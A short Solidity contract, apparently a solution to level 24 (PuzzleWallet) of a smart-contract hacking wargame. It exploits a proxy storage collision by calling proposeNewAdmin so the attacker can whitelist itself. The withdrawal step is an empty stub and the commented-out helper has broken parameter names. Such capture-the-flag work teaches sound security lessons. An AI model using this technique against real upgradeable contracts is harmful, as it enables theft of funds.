// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";

contract Attack24 {
    PuzzleWallet public target;
    PuzzleProxy public proxy;
    address public owner;

    event AddedToWhiteList(address indexed _address);

    constructor(address payable _targetAddress) {
        owner = msg.sender;
        target = PuzzleWallet(_targetAddress);        
        proxy = PuzzleProxy(_targetAddress);
    }

    function attack() public {
        proxy.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
        emit AddedToWhiteList(address(this));
     }

    function withdraw() public view {
        require(owner == msg.sender, "not allowed, sorry");
        // withdraw all funds using a call()
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }



